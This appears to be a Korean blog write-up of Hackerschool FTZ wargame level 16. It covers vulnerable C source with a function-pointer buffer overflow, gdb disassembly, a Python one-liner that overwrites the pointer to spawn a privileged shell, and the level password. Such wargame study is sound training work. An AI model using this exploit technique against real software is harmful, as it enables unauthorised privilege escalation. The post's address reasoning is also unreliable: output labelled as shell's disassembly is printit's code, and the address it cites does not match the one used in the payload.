{"componentChunkName":"component---src-templates-post-template-tsx","path":"/221006/","result":{"data":{"allMarkdownRemark":{"edges":[{"node":{"html":"<h3>0. 들어가기 전에.</h3>\n<p>여기까지 오니 슬슬 disas해서 스택을 살펴보는 과정은 (적어도 간단한 프로그램에선) 익숙해지는 것 같다!</p>\n<h3>1. Level 16</h3>\n<p>오늘은 함수 포인터에 관한 문제다. 소스코드를 확인해보자!</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">#include &lt;stdio.h>\r\n\r\nvoid shell() {\r\n\r\n  setreuid(3097,3097);\r\n\r\n  system(\"/bin/sh\");\r\n\r\n}\r\n\r\nvoid printit() {\r\n\r\n  printf(\"Hello there!\\n\");\r\n\r\n}\r\n\r\nmain()\r\n\r\n{ int crap;\r\n\r\n  void (*call)()=printit;\r\n\r\n  char buf[20];\r\n\r\n  fgets(buf,48,stdin);\r\n\r\n  call();\r\n\r\n}</code></pre></div>\n<p>void(*call)()=printit 부분에서 printit의 포인터를 가져와 call()로 실행시켜준다. 즉, 그냥 printit을 실행하는 함수이다. fgets에서 48바이트 입력받으니 오버플로우는 충분히 가능하다. 그럼 우리가 해야 할 일은?</p>\n<p>*<em>shell 함수의 메모리 주소를 찾아내 <em>call에 덮어씌우면 된다!</em></em></p>\n<p>gdb에서 disas shell을 해보니 :</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">0x08048500 &lt;printit+0>: push   ebp\r\n0x08048501 &lt;printit+1>: mov    ebp,esp\r\n0x08048503 &lt;printit+3>: sub    esp,0x8\r\n0x08048506 &lt;printit+6>: sub    esp,0xc\r\n0x08048509 &lt;printit+9>: push   0x80485c0\r\n0x0804850e &lt;printit+14>:        call   0x80483a4 &lt;printf>\r\n0x08048513 &lt;printit+19>:        add    esp,0x10\r\n0x08048516 &lt;printit+22>:        leave\r\n0x08048517 &lt;printit+23>:        ret\r\n</code></pre></div>\n<p>ebp가 08048500을 가리키는 것을 볼 수 있다. 따라서 그냥 저 주소를 BOF공격으로 넣어주면 된다. 우리 배열부터 call 포인터까지의 거리는 main을 disas해보면 알 수 있을것이다 :</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">0x08048518 &lt;main+0>:    push   ebp\r\n0x08048519 &lt;main+1>:    mov    ebp,esp\r\n0x0804851b &lt;main+3>:    sub    esp,0x38\r\n0x0804851e &lt;main+6>:    mov    DWORD PTR [ebp-16],0x8048500\r\n0x08048525 &lt;main+13>:   sub    esp,0x4\r\n0x08048528 &lt;main+16>:   push   ds:0x80496e8\r\n0x0804852e &lt;main+22>:   push   0x30\r\n0x08048530 &lt;main+24>:   lea    eax,[ebp-56]\r\n0x08048533 &lt;main+27>:   push   eax\r\n0x08048534 &lt;main+28>:   call   0x8048384 &lt;fgets>\r\n0x08048539 &lt;main+33>:   add    esp,0x10\r\n0x0804853c &lt;main+36>:   mov    eax,DWORD PTR [ebp-16]\r\n0x0804853f &lt;main+39>:   call   eax\r\n0x08048541 &lt;main+41>:   leave\r\n0x08048542 &lt;main+42>:   ret\r\n0x08048543 &lt;main+43>:   nop\r\n0x08048544 &lt;main+44>:   nop\r\n0x08048545 &lt;main+45>:   nop\r\n0x08048546 &lt;main+46>:   nop\r\n0x08048547 &lt;main+47>:   nop\r\n0x08048548 &lt;main+48>:   nop\r\n0x08048549 &lt;main+49>:   nop</code></pre></div>\n<p>저번 문제와 똑같이 거리는 40이다. 그럼 공격 코드도 다음과 같을 것이다 :</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">(python -c 'print \"A\"*40+\"\\xd0\\x84\\x04\\x08\"'; cat) | ./attackme</code></pre></div>\n<p>실행하면 Shell을 얻을 수 있다! 이 문제 또한 간단한 것 같다.</p>\n<h2>비밀번호 : king poetic</h2>\n<h2>Source</h2>\n<ul>\n<li>해커스쿨 FTZ</li>\n<li>Me!</li>\n</ul>","frontmatter":{"title":"시스템 해킹(12) : 해커스쿨 FTZ 레벨 16","summary":"","date":"2022.10.06.","before":"2022.10.05.","after":"2022.10.07.","categories":["C-SEC","KOR","pwn"],"thumbnail":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/jpeg;base64,/9j/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/2wBDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wgARCAANABQDASIAAhEBAxEB/8QAGQAAAgMBAAAAAAAAAAAAAAAAAAYBBAcJ/8QAFQEBAQAAAAAAAAAAAAAAAAAABQT/2gAMAwEAAhADEAAAAecqxk1Wh+RFETf/xAAbEAACAwEBAQAAAAAAAAAAAAAEBQECAwYAB//aAAgBAQABBQLk/ozxAp6+x250njzKluVVkeVbX188ot//xAAfEQACAgIBBQAAAAAAAAAAAAACAwERBBMSACExkdL/2gAIAQMBAT8B2ilGRqfkmnJaO5BG2Fm7EEBS+Rl5DcJ1Lio5UF8u9RLSvwPufnr/xAAeEQACAgICAwAAAAAAAAAAAAACAwEEEiEAEyIx0f/aAAgBAgEBPwGsMuOvJoqKdUSa02ASruFNphvYnsFMEQTYJzZgvHNpzjM7LvZGsla16P5z/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIDBBIABRETISIxQRQVIzKSoeH/2gAIAQEABj8Cr8omzfNjSx0cVDkTQ1ctNLk8805aGopgwe2jCPUeqprZBLtoiABi49xzLNBmMiyVFOlaqho6iOCd13t5eH3VtdLF05PQCcctz56Tx+sEaq61NHJQkSC/bjHzI8Wv1lR06X72ySL2Y42nGqqblFzWp5NijQKWJBJHkdscKfy/mP/EAB0QAQADAAIDAQAAAAAAAAAAAAEAESFBUTFhcYH/2gAIAQEAAT8hzE24tLQPVhJNJSUr0wCVxU0kcX1weVyNLTnpyNwLOBO6TwpZRaBNbsWfuEhKrYwKf3z+J//aAAwDAQACAAMAAAAQkN//xAAaEQEAAgMBAAAAAAAAAAAAAAABETEAIaFh/9oACAEDAQE/EEyD5/zMnaTFJWUhNy32jxPPc//EABoRAQACAwEAAAAAAAAAAAAAAAERMQAhQZH/2gAIAQIBAT8QEX6POL11GhsyL86M8GpYB4FVWf/EABgQAQEBAQEAAAAAAAAAAAAAAAERIQAx/9oACAEBAAE/EJoUOgd33xFiGjvwLQjW8KY0zoweyIVAKQD6LTn7qVBNlE8EIiuUSHK55IjERS7B4w67dNSnsqKzV7//2Q=="},"images":{"fallback":{"src":"/static/19e515bba8750881aa8c0a71dc14e660/8c915/C_Sec.jpg","srcSet":"/static/19e515bba8750881aa8c0a71dc14e660/2e6e0/C_Sec.jpg 270w,\n/static/19e515bba8750881aa8c0a71dc14e660/edde1/C_Sec.jpg 540w,\n/static/19e515bba8750881aa8c0a71dc14e660/8c915/C_Sec.jpg 1080w","sizes":"(min-width: 1080px) 1080px, 100vw"},"sources":[{"srcSet":"/static/19e515bba8750881aa8c0a71dc14e660/2e1cd/C_Sec.webp 270w,\n/static/19e515bba8750881aa8c0a71dc14e660/08f1e/C_Sec.webp 540w,\n/static/19e515bba8750881aa8c0a71dc14e660/c34ed/C_Sec.webp 1080w","type":"image/webp","sizes":"(min-width: 1080px) 1080px, 100vw"}]},"width":1080,"height":720}},"publicURL":"/static/19e515bba8750881aa8c0a71dc14e660/C_Sec.jpg"}}}}]}},"pageContext":{"slug":"/221006/"}},"staticQueryHashes":["1523927062"],"slicesMap":{}}